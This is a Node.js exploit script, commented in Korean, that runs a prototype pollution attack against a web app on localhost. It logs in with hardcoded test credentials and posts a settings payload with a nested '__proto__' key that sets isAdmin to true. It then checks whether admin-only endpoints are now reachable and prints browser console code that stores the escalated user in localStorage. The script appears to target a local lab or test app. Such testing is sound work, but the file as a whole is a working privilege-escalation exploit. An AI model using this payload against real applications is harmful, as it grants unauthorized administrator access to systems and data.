const axios = require('axios');

async function fullTest() {
  try {
    console.log('🔄 Full Prototype Pollution Test 시작...\n');
    
    // 1. 로그인
    const loginResponse = await axios.post('http://localhost:5000/api/users/login', {
      email: 'bitcoin@example.com',
      password: 'BitcoinMoon$'
    });
    
    const token = loginResponse.data.token;
    console.log('✅ 로그인 성공');
    console.log('기본 사용자 정보:', loginResponse.data.user);
    
    // 2. /auth/me로 현재 사용자 정보 확인
    console.log('\n📋 Prototype Pollution 전 사용자 정보:');
    const beforeResponse = await axios.get('http://localhost:5000/api/auth/me', {
      headers: { Authorization: `Bearer ${token}` }
    });
    console.log('role:', beforeResponse.data.user.role);
    console.log('isAdmin 속성:', beforeResponse.data.user.isAdmin);
    
    // 3. Prototype Pollution 공격 (중첩된 __proto__ 방식)
    console.log('\n🔥 Prototype Pollution 공격 실행...');
    const pollutionResponse = await axios.post('http://localhost:5000/api/settings/preferences', {
      settings: {
        theme: 'dark',
        nested: {
          "__proto__": {
            "isAdmin": true
          }
        }
      }
    }, {
      headers: { Authorization: `Bearer ${token}` }
    });
    
    console.log('공격 응답:', pollutionResponse.data.success ? '성공' : '실패');
    
    // 4. 공격 후 사용자 정보 다시 확인
    console.log('\n📋 Prototype Pollution 후 사용자 정보:');
    const afterResponse = await axios.get('http://localhost:5000/api/auth/me', {
      headers: { Authorization: `Bearer ${token}` }
    });
    console.log('role:', afterResponse.data.user.role);
    console.log('isAdmin 속성:', afterResponse.data.user.isAdmin);
    
    // 5. 관리자 기능 테스트
    console.log('\n🎯 관리자 기능 접근 테스트:');
    try {
      const adminResponse = await axios.post('http://localhost:5000/api/settings/global-settings', {
        key: 'test_admin_setting',
        value: 'hacked_successfully'
      }, {
        headers: { Authorization: `Bearer ${token}` }
      });
      
      console.log('🚨 관리자 기능 접근 성공!');
      console.log('결과:', adminResponse.data);
      
    } catch (err) {
      console.log('❌ 관리자 기능 접근 실패:', err.response?.data?.message);
    }
    
    // 6. 프론트엔드에서 사용할 수 있는 명령어 제공
    console.log('\n🌐 프론트엔드에서 실행할 코드:');
    console.log(`
// 개발자 도구 Console에서 실행:
fetch('http://localhost:5000/api/auth/me', {
  headers: { 'Authorization': 'Bearer ${token}' }
})
.then(r => r.json())
.then(data => {
  console.log('업데이트된 사용자 정보:', data.user);
  if (data.user.isAdmin) {
    console.log('🚨 isAdmin 속성 확인됨!');
    // localStorage 업데이트
    localStorage.setItem('user', JSON.stringify(data.user));
    // 페이지 새로고침으로 UI 갱신
    window.location.reload();
  }
});
    `);
    
  } catch (error) {
    console.error('테스트 오류:', error.response?.data || error.message);
  }
}

fullTest();
